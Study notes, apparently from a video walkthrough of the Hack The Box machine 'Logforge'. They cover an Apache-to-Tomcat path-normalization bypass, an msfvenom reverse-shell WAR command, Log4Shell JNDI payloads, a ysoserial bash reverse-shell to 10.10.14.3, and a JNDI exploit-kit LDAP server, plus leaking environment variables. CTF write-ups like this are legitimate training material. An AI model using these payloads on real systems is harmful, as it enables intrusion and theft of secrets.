# Logforge
#tomcat #log4j
- Video: https://www.youtube.com/watch?v=XG14EstTgQ4
- When seeing http on port 80 and 8080, consider the fact there mgight be some sort of reverse proxy forwarding the traffic from 80 to 8080
- Descrepency between what the error message for a 404 not found and the server header
- Server header says Apache and webpage says tomcat, therefore we know there is a reverse proxy
- Apache is blocking us from accessing the tomcat manager
- [Breaking parser logic attack](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)
- This kind of attack is a way of talking to tomcat bypassing apaches blocking
- Example of attack:
	- Navigating to `/doesnotexist`, gives us a 404 as expected
	- Navigating to `/doesnotexist/..;/manager/` gets gives us access to the manager page after authenticating
	- **NOTE** - remember trailing slash, otherwise it will not work as the browser 
- Another bypass is `/;name=something/manager/`
- What is happening here?
	- Apache is set up to block aything that begins with `/manager`
	- Apache reads `/;name=something` as a url and therefore allows it and passes it to tomcat
	- When it gets to tomcat, tomcat removes it as it does not recognise it as a url
	- Tomcat then continues going down the route logic and hands back the manager page
- Can deploy a war file using 
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.3 LPORT=9001 -f war -o shell.war
```
- This however wont work in this instance as tomcat is set up to only accept files up to 1 byte
- Tomcat is not vulnerable to Log4j by default
- Test Log4j vulnerability by creating the following payload and setting up a netcat listener is the respective port
```bash
${jndi:ldap://10.10.14.3:9001/doesnotexist}}
```
- We wont see the full url as ldap is trying to complete a hadshake but never does 
- To exploit Lof4j we first have to create the payload
- Using [yososerial-modified](https://github.com/pimps/ysoserial-modified) for this example
- To create the payload run
```bash
java -jar yososerial-modified.jar <collection> bash 'bash -i >& /dev/tcp/10.10.14.3/9001 0>&1' > ~/file.ser
```
- Next is the JNDI exploit kit, we will be using this to stand up an LDAP server and serve the malicious serialized java file
- Ldap is on port 1389
```bash
java -jar JDNI-Injection-Exploit-1.0-SNAPSHOT.jar -L 10.10.14.3:1389 -P ~/file.ser
```
- Pick a url from the urls privded under `--- JNDI Links ---` to use in the payload
- If not sure start with most recent version and work down  
- Create payload like:
```bash
${jndi:ldap://10.10.14.3:9001/fhdhsjd}
```
 - Useful command:
	 -  `ss -ltnp` to show open ports, like `netstat -tulnp`
	 -  `ps -ef --forest` to show processes relationships
- Java is running the ftp server
- Can decompile to ftpserver file and see that it gets user and password from environment vairables
- Could use [canary tokens](https://canarytokens.org/generate) to generate a log4shell payload to check if vulnerable in the first place but also to leak the environment variables, however htb boxes are not connected to the internet
- JNDI kit server is not verbose enough to say that a failed request to the jndi server was made and what the request was after
- Can use wireshark instead to see the connection attempt and use the connection attempt to leak the environment variables